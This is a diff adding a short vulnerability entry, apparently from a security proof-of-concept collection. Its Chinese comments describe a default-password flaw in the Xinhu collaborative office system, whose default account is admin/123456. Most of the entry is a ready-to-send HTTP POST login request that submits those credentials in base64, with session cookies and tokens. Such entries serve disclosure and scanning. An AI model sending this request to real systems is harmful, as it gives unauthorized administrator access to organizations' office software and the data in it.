@@ -1,0 +1,11 @@
+# 信呼协同办公系统默认口令
+# 信呼协同办公系统默认口令漏洞，默认账户口令为admin/123456
+POST /index.php?a=check&m=login&d=&ajaxbool=true&rnd=196108&acid=80002169&bid=hd_tag_m8mv25j5 HTTP/1.1
+Host: www.swaf.com
+Cookie: Hm_lvt_6f87fd88433b3d92889606d7bcd9d1f8=1703138861; PHPSESSID=qrvathit2hmuqka7g0upbo6e56; deviceid=1703138899511; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0; Hm_lpvt_6f87fd88433b3d92889606d7bcd9d1f8=1703140051
+RM-PRO-BusinessID: hd_tag_m8mv25j5
+RM-PRO-Token: e16e034956e05a124264f0138fa36272
+RM-PRO-Time: 1742808471759
+User-Agent: curl/7.83.1
+
+rempass=0&jmpass=false&device=1703138899511&ltype=0&adminuser=YWRtaW4%3A&adminpass=MTIzNDU2&yanzm=
